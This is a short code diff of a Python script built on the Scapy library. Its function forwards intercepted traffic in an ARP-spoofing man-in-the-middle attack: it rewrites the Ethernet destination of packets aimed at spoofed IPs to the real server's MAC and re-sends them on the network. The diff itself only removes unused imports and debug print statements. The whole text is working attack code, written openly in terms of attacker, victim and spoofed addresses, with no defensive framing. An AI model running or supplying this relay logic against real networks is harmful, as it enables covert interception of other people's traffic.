@@ -1,6 +1,5 @@
 from scapy.all import *
-from scapy.layers.inet import IP, TCP, UDP
-import util
+from scapy.layers.inet import IP
 
 
 def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC, networkInterface):
@@ -11,7 +10,6 @@ def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC
     # case 1: victim request an IP which has as destination MAC of attacker
     # find corresponding MAC to that IP in array of spoffed IPs and
     # put as destination to the new packet
-    print(pkt.show())
     if pkt[Ether].dst == attackerMAC:
         if pkt[IP].dst in spoofIP:
             pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
@@ -26,4 +24,3 @@ def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC
 
         # send packet to the network
         sendp(pkt, iface=networkInterface)
-        print(pkt.show())
